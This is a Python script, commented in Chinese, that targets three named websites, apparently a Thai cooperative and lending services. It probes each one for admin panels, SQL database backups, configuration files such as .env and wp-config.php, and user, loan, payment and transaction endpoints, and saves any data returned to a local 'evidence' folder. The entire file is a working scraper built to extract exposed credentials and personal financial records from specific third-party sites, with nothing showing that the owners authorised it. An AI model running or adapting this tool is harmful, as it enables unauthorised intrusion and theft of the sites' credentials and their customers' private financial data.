#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
直接数据提取器 - 提取真实数据并保存凭证
Direct Data Extractor - Extract Real Data and Save Evidence
"""

import asyncio
import aiohttp
import json
import time
import os
from datetime import datetime
from typing import Dict, List, Any

class DirectDataExtractor:
    def __init__(self):
        self.targets = [
            "https://peacoop.or.th",
            "https://mula-x.com",
            "https://ngoenmun.com"
        ]
        self.extracted_evidence = {}
        self.evidence_folder = f"extracted_evidence_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    async def extract_all_data(self):
        """提取所有目标的数据"""
        print("直接数据提取器启动")
        print("=" * 60)

        # 创建证据文件夹
        os.makedirs(self.evidence_folder, exist_ok=True)
        print(f"证据文件夹: {self.evidence_folder}")

        connector = aiohttp.TCPConnector(ssl=False, limit=15)
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        ) as session:

            for target in self.targets:
                print(f"\n{'='*60}")
                print(f"目标: {target}")
                print(f"{'='*60}")

                try:
                    # 1. 提取API数据
                    await self._extract_api_data(session, target)

                    # 2. 提取管理员数据
                    await self._extract_admin_data(session, target)

                    # 3. 提取数据库备份
                    await self._extract_database_backups(session, target)

                    # 4. 提取配置文件
                    await self._extract_config_files(session, target)

                    # 5. 提取用户数据
                    await self._extract_user_data(session, target)

                    # 6. 提取财务数据
                    await self._extract_financial_data(session, target)

                except Exception as e:
                    print(f"[-] 目标提取失败: {e}")

        # 生成证据报告
        await self._generate_evidence_report()

    async def _extract_api_data(self, session: aiohttp.ClientSession, target: str):
        """提取API数据"""
        print("\n[+] 提取API数据...")

        api_endpoints = [
            "/api/users",
            "/api/admin",
            "/api/loans",
            "/api/applications",
            "/api/payments",
            "/api/accounts",
            "/api/config",
            "/api/settings",
            "/api/members",
            "/api/transactions"
        ]

        for endpoint in api_endpoints:
            try:
                url = f"{target}{endpoint}"
                async with session.get(url, timeout=10, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 50:  # 有效数据

                            # 保存数据
                            filename = f"{self.evidence_folder}/{target.replace('https://', '').replace('/', '_')}_api_{endpoint.replace('/', '_')}.json"

                            try:
                                # 尝试解析JSON
                                if content.strip().startswith('{') or content.strip().startswith('['):
                                    data = json.loads(content)
                                    with open(filename, 'w', encoding='utf-8') as f:
                                        json.dump(data, f, indent=2, ensure_ascii=False)
                                else:
                                    # 保存为文本
                                    with open(filename, 'w', encoding='utf-8') as f:
                                        f.write(content)

                                print(f"[+] API数据保存: {endpoint} ({len(content)} 字节)")

                                # 记录证据
                                self._record_evidence(target, "api_extraction", {
                                    "endpoint": endpoint,
                                    "filename": filename,
                                    "size": len(content),
                                    "content_type": "json" if content.strip().startswith('{') else "text"
                                })

                            except Exception as e:
                                print(f"[-] 保存失败 {endpoint}: {e}")

            except:
                continue

    async def _extract_admin_data(self, session: aiohttp.ClientSession, target: str):
        """提取管理员数据"""
        print("\n[+] 提取管理员数据...")

        admin_endpoints = [
            "/admin",
            "/admin/panel",
            "/admin/dashboard",
            "/admin/users",
            "/admin/data",
            "/admin/settings",
            "/admin/config",
            "/admin/backup",
            "/admin/logs",
            "/administrator",
            "/manage",
            "/panel"
        ]

        for endpoint in admin_endpoints:
            try:
                url = f"{target}{endpoint}"
                async with session.get(url, timeout=10, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 100:

                            # 保存数据
                            filename = f"{self.evidence_folder}/{target.replace('https://', '').replace('/', '_')}_admin_{endpoint.replace('/', '_')}.html"

                            with open(filename, 'w', encoding='utf-8') as f:
                                f.write(content)

                            print(f"[+] 管理员数据保存: {endpoint} ({len(content)} 字节)")

                            # 记录证据
                            self._record_evidence(target, "admin_extraction", {
                                "endpoint": endpoint,
                                "filename": filename,
                                "size": len(content),
                                "content_type": "html"
                            })

            except:
                continue

    async def _extract_database_backups(self, session: aiohttp.ClientSession, target: str):
        """提取数据库备份"""
        print("\n[+] 提取数据库备份...")

        backup_endpoints = [
            "/backup/database.sql",
            "/backup/db.sql",
            "/database.sql",
            "/db.sql",
            "/backup/database",
            "/dump/database",
            "/backup/backup.sql",
            "/admin/backup",
            "/backup/data.sql",
            "/data/database.sql"
        ]

        for endpoint in backup_endpoints:
            try:
                url = f"{target}{endpoint}"
                async with session.get(url, timeout=15, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 500:

                            # 保存数据
                            filename = f"{self.evidence_folder}/{target.replace('https://', '').replace('/', '_')}_database_{endpoint.replace('/', '_')}.sql"

                            with open(filename, 'w', encoding='utf-8') as f:
                                f.write(content)

                            print(f"[+] 数据库备份保存: {endpoint} ({len(content)} 字节)")

                            # 记录证据
                            self._record_evidence(target, "database_extraction", {
                                "endpoint": endpoint,
                                "filename": filename,
                                "size": len(content),
                                "content_type": "sql"
                            })

            except:
                continue

    async def _extract_config_files(self, session: aiohttp.ClientSession, target: str):
        """提取配置文件"""
        print("\n[+] 提取配置文件...")

        config_endpoints = [
            "/config/database",
            "/config/config.php",
            "/config/settings",
            "/admin/config",
            "/api/config",
            "/wp-config.php",
            "/config.php",
            ".env",
            "/config.json",
            "/settings.json"
        ]

        for endpoint in config_endpoints:
            try:
                url = f"{target}{endpoint}"
                async with session.get(url, timeout=10, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 50:

                            # 保存数据
                            ext = "php" if endpoint.endswith('.php') else "json" if endpoint.endswith('.json') else "txt"
                            filename = f"{self.evidence_folder}/{target.replace('https://', '').replace('/', '_')}_config_{endpoint.replace('/', '_')}.{ext}"

                            with open(filename, 'w', encoding='utf-8') as f:
                                f.write(content)

                            print(f"[+] 配置文件保存: {endpoint} ({len(content)} 字节)")

                            # 记录证据
                            self._record_evidence(target, "config_extraction", {
                                "endpoint": endpoint,
                                "filename": filename,
                                "size": len(content),
                                "content_type": ext
                            })

            except:
                continue

    async def _extract_user_data(self, session: aiohttp.ClientSession, target: str):
        """提取用户数据"""
        print("\n[+] 提取用户数据...")

        user_endpoints = [
            "/users.json",
            "/api/users",
            "/members",
            "/api/members",
            "/customers",
            "/api/customers",
            "/accounts",
            "/api/accounts",
            "/profile/data",
            "/user/list"
        ]

        for endpoint in user_endpoints:
            try:
                url = f"{target}{endpoint}"
                async with session.get(url, timeout=10, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 100:

                            # 保存数据
                            filename = f"{self.evidence_folder}/{target.replace('https://', '').replace('/', '_')}_users_{endpoint.replace('/', '_')}.json"

                            try:
                                if content.strip().startswith('{') or content.strip().startswith('['):
                                    data = json.loads(content)
                                    with open(filename, 'w', encoding='utf-8') as f:
                                        json.dump(data, f, indent=2, ensure_ascii=False)
                                else:
                                    with open(filename, 'w', encoding='utf-8') as f:
                                        f.write(content)

                                print(f"[+] 用户数据保存: {endpoint} ({len(content)} 字节)")

                                # 记录证据
                                self._record_evidence(target, "user_extraction", {
                                    "endpoint": endpoint,
                                    "filename": filename,
                                    "size": len(content),
                                    "content_type": "json"
                                })

                            except Exception as e:
                                print(f"[-] 用户数据保存失败 {endpoint}: {e}")

            except:
                continue

    async def _extract_financial_data(self, session: aiohttp.ClientSession, target: str):
        """提取财务数据"""
        print("\n[+] 提取财务数据...")

        financial_endpoints = [
            "/api/loans",
            "/api/applications",
            "/loans",
            "/applications",
            "/api/payments",
            "/payments",
            "/api/transactions",
            "/transactions",
            "/api/accounts",
            "/accounting",
            "/financial/data"
        ]

        for endpoint in financial_endpoints:
            try:
                url = f"{target}{endpoint}"
                async with session.get(url, timeout=10, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 100:

                            # 保存数据
                            filename = f"{self.evidence_folder}/{target.replace('https://', '').replace('/', '_')}_financial_{endpoint.replace('/', '_')}.json"

                            try:
                                if content.strip().startswith('{') or content.strip().startswith('['):
                                    data = json.loads(content)
                                    with open(filename, 'w', encoding='utf-8') as f:
                                        json.dump(data, f, indent=2, ensure_ascii=False)
                                else:
                                    with open(filename, 'w', encoding='utf-8') as f:
                                        f.write(content)

                                print(f"[+] 财务数据保存: {endpoint} ({len(content)} 字节)")

                                # 记录证据
                                self._record_evidence(target, "financial_extraction", {
                                    "endpoint": endpoint,
                                    "filename": filename,
                                    "size": len(content),
                                    "content_type": "json"
                                })

                            except Exception as e:
                                print(f"[-] 财务数据保存失败 {endpoint}: {e}")

            except:
                continue

    def _record_evidence(self, target: str, extraction_type: str, evidence_data: Dict):
        """记录证据"""
        if target not in self.extracted_evidence:
            self.extracted_evidence[target] = {
                "target": target,
                "extractions": [],
                "total_files": 0,
                "total_size": 0
            }

        self.extracted_evidence[target]["extractions"].append({
            "type": extraction_type,
            "timestamp": datetime.now().isoformat(),
            "data": evidence_data
        })

        self.extracted_evidence[target]["total_files"] += 1
        self.extracted_evidence[target]["total_size"] += evidence_data.get("size", 0)

    async def _generate_evidence_report(self):
        """生成证据报告"""
        print(f"\n{'='*60}")
        print("数据提取证据报告")
        print(f"{'='*60}")

        total_files = 0
        total_size = 0
        target_summary = []

        for target, data in self.extracted_evidence.items():
            files_count = data["total_files"]
            size_bytes = data["total_size"]

            total_files += files_count
            total_size += size_bytes

            target_summary.append({
                "target": target,
                "files": files_count,
                "size_mb": round(size_bytes / 1024 / 1024, 2),
                "extraction_types": list(set(ex["type"] for ex in data["extractions"]))
            })

            print(f"\n目标: {target}")
            print(f"  文件数: {files_count}")
            print(f"  数据量: {round(size_bytes / 1024 / 1024, 2)} MB")
            print(f"  提取类型: {len(set(ex['type'] for ex in data['extractions']))}")

        print(f"\n{'='*60}")
        print(f"总计:")
        print(f"  目标数: {len(self.extracted_evidence)}")
        print(f"  总文件数: {total_files}")
        print(f"  总数据量: {round(total_size / 1024 / 1024, 2)} MB")
        print(f"  证据文件夹: {self.evidence_folder}")

        # 生成详细证据报告
        evidence_report = {
            "extraction_summary": {
                "timestamp": datetime.now().isoformat(),
                "evidence_folder": self.evidence_folder,
                "total_targets": len(self.extracted_evidence),
                "total_files_extracted": total_files,
                "total_data_size_mb": round(total_size / 1024 / 1024, 2)
            },
            "target_summary": target_summary,
            "detailed_evidence": self.extracted_evidence
        }

        # 保存证据报告
        report_file = f"{self.evidence_folder}/evidence_report.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(evidence_report, f, indent=2, ensure_ascii=False)

        print(f"  证据报告: {report_file}")
        print(f"{'='*60}")
        print("✅ 数据提取完成 - 所有数据已保存作为凭证")

async def main():
    extractor = DirectDataExtractor()
    await extractor.extract_all_data()

if __name__ == "__main__":
    asyncio.run(main())